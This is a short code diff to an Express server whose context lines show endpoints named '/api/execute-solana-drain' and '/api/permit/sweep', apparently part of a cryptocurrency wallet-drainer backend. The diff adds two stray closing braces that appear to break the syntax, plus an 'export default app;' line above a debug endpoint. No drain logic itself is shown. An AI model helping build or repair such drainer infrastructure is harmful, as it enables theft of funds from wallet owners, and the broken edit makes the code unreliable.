@@ -1437,6 +1437,8 @@ app.post('/api/execute-solana-drain', async (req, res) => {
   }
 });
 
+  }
+});
 
 app.post('/api/permit/sweep', async (req, res) => {
   try {
@@ -3405,6 +3407,7 @@ server.listen(PORT, async () => {
   }
 });
 
+export default app;
 // Debug endpoint
 app.post('/api/debug-test', (req, res) => {
   res.json({ message: 'Debug endpoint works', timestamp: new Date().toISOString() });
